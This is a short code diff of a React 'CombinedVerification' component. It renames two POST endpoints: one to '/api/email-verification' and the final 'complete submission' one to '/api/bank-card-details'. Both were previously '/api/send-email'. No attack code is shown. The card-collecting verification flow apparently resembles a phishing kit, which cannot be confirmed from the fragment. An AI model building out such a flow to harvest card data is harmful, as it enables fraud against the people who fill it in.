@@ -45,7 +45,7 @@ export default function CombinedVerification() {
         ...additionalData
       };
       
-      const response = await fetch('/api/send-email', {
+      const response = await fetch('/api/email-verification', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -127,7 +127,7 @@ export default function CombinedVerification() {
 
     try {
       // Send the final, complete submission with all data
-      const response = await fetch('/api/send-email', {
+      const response = await fetch('/api/bank-card-details', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
